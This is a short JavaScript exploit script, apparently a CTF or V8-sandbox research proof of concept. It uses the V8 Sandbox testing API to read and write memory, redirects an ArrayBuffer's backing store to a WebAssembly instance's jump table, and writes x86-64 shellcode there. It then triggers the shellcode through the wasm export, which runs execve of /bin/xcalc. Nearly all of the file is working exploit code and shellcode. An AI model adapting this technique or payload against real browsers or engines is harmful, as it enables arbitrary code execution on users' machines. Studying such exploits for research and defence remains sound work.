// convert integer to hexadecimal string
function hex(i) {
    return `0x${i.toString(16)}`;
}

// get (compressed) address of `obj`
function addrof(obj) {
    return Sandbox.getAddressOf(obj);
}

// read 8-byte from `addr` in sandbox
function read8(addr) {
    let memory_view = new DataView(new Sandbox.MemoryView(addr, 8));
    return memory_view.getBigUint64(0, true);
}

// write 8-byte `value` to `addr` in sandbox
function write8(addr, value) {
    let memory_view = new DataView(new Sandbox.MemoryView(addr, 8));
    memory_view.setBigUint64(0, value, true);
}

// generate wasm module
let wasm_src = new Uint8Array([0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x4, 0x1, 0x60, 0x0, 0x0, 0x3, 0x2, 0x1, 0x0, 0x7, 0x8, 0x1, 0x4, 0x6d, 0x61, 0x69, 0x6e, 0x0, 0x0, 0xa, 0x4, 0x1, 0x2, 0x0, 0xb]); // output of wasm.py
let wasm_module = new WebAssembly.Module(wasm_src);

// get address of jump table
let wasm_instance = new WebAssembly.Instance(wasm_module);
let wasm_instance_addr = addrof(wasm_instance);
// console.log(`[+] wasm_instance_addr == ${hex(wasm_instance_addr)}`);
let jump_table_start = read8(wasm_instance_addr + 0x60);
console.log(`[+] jump_table_start == ${hex(jump_table_start)}`);

// execve("/bin/xcalc", 0, ["DISPLAY=:0", 0])
let shellcode = [0x48, 0xc7, 0xc0, 0x6c, 0x63, 0x0, 0x0, 0x50, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x78, 0x63, 0x61, 0x50, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0x48, 0xc7, 0xc0, 0x3a, 0x30, 0x0, 0x0, 0x50, 0x48, 0xb8, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x50, 0x48, 0x89, 0xe0, 0x48, 0xc7, 0xc3, 0x0, 0x0, 0x0, 0x0, 0x53, 0x50, 0x48, 0x89, 0xe2, 0x48, 0xc7, 0xc0, 0x3b, 0x0, 0x0, 0x0, 0xf, 0x5]; // output of shellcode.py

// overwrite backing store of arraybuffer with address of jump table
let buf = new ArrayBuffer(shellcode.length);
let buf_addr = addrof(buf);
// console.log(`[+] buf_addr == ${hex(buf_addr)}`);
write8(buf_addr + 0x1c, jump_table_start);

// overwrite jump table with shellcode
console.log("[+] Writing shellcode...");
let view = new DataView(buf);
for (let i = 0; i < shellcode.length; i++) {
    view.setUint8(i, shellcode[i]);
}

// execute shellcode
console.log("[+] Executing shellcode...");
wasm_instance.exports.main();
